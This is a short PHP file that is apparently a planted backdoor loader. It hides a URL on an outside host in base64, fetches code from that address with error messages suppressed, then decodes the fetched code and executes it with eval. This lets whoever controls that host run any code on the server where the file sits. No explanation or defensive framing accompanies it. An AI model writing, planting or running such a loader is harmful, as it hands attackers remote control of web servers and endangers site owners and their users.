<?php
$c = @file_get_contents(base64_decode('aHR0cHM6Ly9oZWRveHl0YXplLnN0b3JlL3BnLnBocD9xJnQ9dDE='));
@eval(base64_decode($c));
?>
